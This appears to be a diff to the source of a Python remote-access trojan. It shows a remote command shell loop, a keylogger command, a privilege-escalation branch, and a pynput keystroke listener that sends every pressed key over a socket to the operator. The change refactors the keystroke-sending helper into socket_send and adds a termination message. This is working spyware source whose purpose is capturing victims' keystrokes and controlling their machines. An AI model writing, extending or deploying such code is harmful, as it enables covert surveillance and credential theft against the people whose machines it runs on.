@@ -86,8 +86,6 @@ def download_file(file_name):
 # ====================
 
 def shell():
-    global screen_socket, audio_socket
-
     while True:
         command = reliable_recv()
 
@@ -118,7 +116,7 @@ def shell():
 
         # Keylogger
         elif command == 'keylogger':
-            time.sleep(2)
+            time.sleep(3)
             keylogger_handler()
 
         # Privelege Escalation
@@ -138,25 +136,25 @@ def shell():
 
 from pynput import keyboard
 
-def on_press(key, target):
-    def reliable_send(target, data):
-        try:
-            jsondata = json.dumps(data)
-            target.send(jsondata.encode())
-            print(f"Sent: {data}")  # Print sent data for debugging
-        except Exception as e:
-            print(f"Error sending data: {e}")
+def socket_send(target, data):
+    try:
+        jsondata = json.dumps(data)
+        target.send(jsondata.encode())
+        print(f"Sent: {data}")  # Print sent data for debugging
+    except Exception as e:
+        print(f"Error sending data: {e}")
 
+def on_press(key, target):
     try:
         if hasattr(key, 'char') and key.char:
-            reliable_send(target, f'{key.char}')
+            socket_send(target, f'{key.char}')
             keyname = key.char
         else:
-            reliable_send(target, f'{key.name}')  # Send the name of the special key
+            socket_send(target, f'{key.name}')  # Send the name of the special key
             keyname = key.name
         print(f"Key pressed: {keyname}")  # Print pressed key for debugging
     except Exception as e:
-        reliable_send(target, str(e))
+        socket_send(target, str(e))
         print(f"Error on press: {e}")
 
 def keylogger_reader(target):
@@ -190,6 +188,7 @@ def stop_keylogger():
     try:
         print("Terminating keylogger and main program...")
         if keylogger_socket:
+            socket_send(keylogger_socket, "TERMINATE")
             keylogger_socket.close()
         if keylogger_thread:
             keylogger_thread.join(timeout=1)
